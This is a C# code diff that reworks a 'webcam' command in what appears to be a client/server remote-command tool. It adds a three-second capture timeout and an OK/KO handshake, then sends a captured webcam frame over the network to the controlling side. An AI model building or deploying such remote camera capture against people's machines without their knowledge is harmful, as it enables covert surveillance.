@@ -4,15 +4,18 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Threading;
+using System.Timers;
 using AForge.Video;
 using AForge.Video.DirectShow;
 using NetworkManager;
 using Shared;
+using Timer = System.Timers.Timer;
 
 namespace Commands
 {
     internal class Webcam : ICommand
     {
+        #region ICommand properties
         public string name { get; } = "webcam";
 
         public string description { get; } = "Webcam control utility, able to take pictures and record videos";
@@ -33,19 +36,30 @@ namespace Commands
         };
 
         public List<string> savedData { get; set; } = new List<string>();
-
+        #endregion ICommand properties
 
         VideoCaptureDevice video { get; set; }
+
+        bool mustReturn { get; set; }
 
 
         public CommandsManager.PreProcessResult PreProcessCommand(List<string> args)
         {
-            throw new NotImplementedException();
+            savedData.Add(args[1]);
+            return CommandsManager.PreProcessResult.OK;
         }
 
         public void ClientMethod(List<string> args)
         {
-            var fileName = "webcamshot.png";
+            var fileName = savedData[0];
+
+            var result = GlobalNetworkManager.ReadLine();
+
+            if (result != "OK")
+            {
+                ColorTools.WriteCommandError("Unable to use the webcam in the default timespan, maybe another application is using it");
+                return;
+            }
 
             // Get data length
             var dataLength = int.Parse(GlobalNetworkManager.ReadLine());
@@ -70,16 +84,30 @@ namespace Commands
         public void ServerMethod(List<string> args)
         {
             GlobalNetworkManager.WriteLine(clientFlags[0]);
+            mustReturn = false;
 
             var captureDevice = new FilterInfoCollection(FilterCategory.VideoInputDevice)[0];
             video = new VideoCaptureDevice(captureDevice.MonikerString);
-            video.NewFrame += FinalVideo_NewFrame;
+            video.NewFrame += Video_NewFrame;
             video.Start();
-            video.WaitForStop();
+
+            // Leave 3 seconds to get a frame
+            var timer = new Timer(3000);
+            timer.Elapsed += timer_Elapsed;
+            timer.AutoReset = false;
+            timer.Enabled = true;
+
+            while (!mustReturn)
+            {
+                Thread.Sleep(100);
+            }
         }
 
-        void FinalVideo_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        void Video_NewFrame(object sender, NewFrameEventArgs eventArgs)
         {
+            video.SignalToStop();
+            GlobalNetworkManager.WriteLine("OK");
+
             using (var ms = new MemoryStream())
             {
                 eventArgs.Frame.Save(ms, ImageFormat.Png);
@@ -92,7 +120,17 @@ namespace Commands
                 GlobalNetworkManager.ReadStreamAndWriteToNetworkStream(ms, 4096);
             }
 
-            video.SignalToStop();
+            mustReturn = true;
+        }
+
+        void timer_Elapsed(object sender, ElapsedEventArgs e)
+        {
+            // If the video source is still running, no pic was taken
+            if (video.IsRunning)
+            {
+                GlobalNetworkManager.WriteLine("KO");
+                mustReturn = true;
+            }
         }
     }
 }
